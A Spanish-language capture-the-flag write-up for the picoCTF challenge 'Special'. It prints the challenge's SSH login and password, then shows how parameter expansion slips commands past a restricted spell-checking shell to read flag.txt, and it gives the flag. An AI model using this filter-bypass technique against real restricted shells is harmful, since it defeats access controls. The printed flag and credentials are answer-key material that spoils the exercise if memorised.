# special

## Descripcion
Don't power users get tired of making spelling mistakes in the shell? Not anymore! Enter Special, the Spell Checked Interface for Affecting Linux. Now, every word is properly spelled and capitalized... automatically and behind-the-scenes! Be the first to test Special in beta, and feel free to tell us all about how Special streamlines every development process that you face. When your co-workers see your amazing shell interface, just tell them: That's Special (TM)Start your instance to see connection details.`ssh -p 55752 ctf-player@saturn.picoctf.net`The password is `af86add3`

## Solucion
Nos conectamos al servidor con las credenciales que nos proporciona el reto:
```bash
┌──(xrengariox㉿PC)-[~]
└─$ 
ssh -p 55752 ctf-player@saturn.picoctf.net
```

Despues de estar explorando y probando navegar por directorios, vemos que esta shell, cambia letras y no nos permite ejecutar los comandos con normalidad, y ni siquiera nos permite cambiar de shell a otra funcional como bash o zsh.
Las pistas del reto nos dicen que busquemos diferentes sintaxis de shell, entonces toca investigar un poco mas acerca de este tema. Encontre un write-up sobre el reto en el que decian o mencionaban una sitaxis de shell con el siguiente estilo:
```shell
${parameter=word}
```
En donde debiamos reemplazar word por el comando que queremos ejecutar, pero la explicacion no era bastante clara, por lo que tuve que buscar mas informacion sobre como se usaba esto.
Encontre que esta sintaxis se llamaba Parameter Expansion, y aprendi mas sobre esta sintaxis.
Con esto ahora si ya podemos comenzar a resolver el reto y movernos por los directorios:
```shell
Special$ ${parameter=ls}
${parameter=ls} 
blargh
Special$ ${parameter=cd blargh}
${parameter=cd blargh} 
Special$ ${parameter=ls}
${parameter=ls} 
blargh
Special$ ${parameter=cd blargh}
${parameter=cd blargh} 
Special$ ${parameter=pwd}
${parameter=pwd} 
/home/ctf-player
Special$ ${parameter=ls /blargh}
${parameter=ls /blargh} 
ls: cannot access '/blargh': No such file or directory
Special$ ${parameter=ls blargh}
${parameter=ls blargh} 
flag.txt
Special$ ${parameter= cat blargh/flag.txt}
${parameter= cat blargh/flag.txt} 
picoCTF{5p311ch3ck_15_7h3_w0r57_6a2763f6}
Special$ 
```

Y asi fue como finalmente pudimos obtener la flag:
```flag
picoCTF{5p311ch3ck_15_7h3_w0r57_6a2763f6}
```


## Notas adicionales

## Referencias

* https://pubs.opengroup.org/onlinepubs/009695399/utilities/xcu_chap02.html
* https://josephkimiri.github.io/posts/Special/